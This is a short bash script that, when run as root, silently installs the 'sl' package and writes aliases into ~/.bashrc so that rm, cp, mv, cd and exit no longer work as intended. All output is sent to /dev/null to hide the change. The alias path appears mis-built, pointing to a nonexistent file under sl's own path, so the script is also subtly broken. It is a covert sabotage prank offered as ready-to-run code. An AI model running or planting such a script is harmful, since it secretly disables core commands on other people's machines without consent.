#!/bin/bash

if [ "`whoami`" == "root" ]; then
	apt-get install sl -y || yum install sl -y
	path=`which sl`
	echo "alias rm='${path}/sl'" >> ~/.bashrc
	echo "alias cp='${path}/sl'" >> ~/.bashrc
	echo "alias mv='${path}/sl'" >> ~/.bashrc
	echo "alias cd='${path}/sl'" >> ~/.bashrc
	echo "alias exit='${path}/sl'" >> ~/.bashrc
fi &> /dev/null
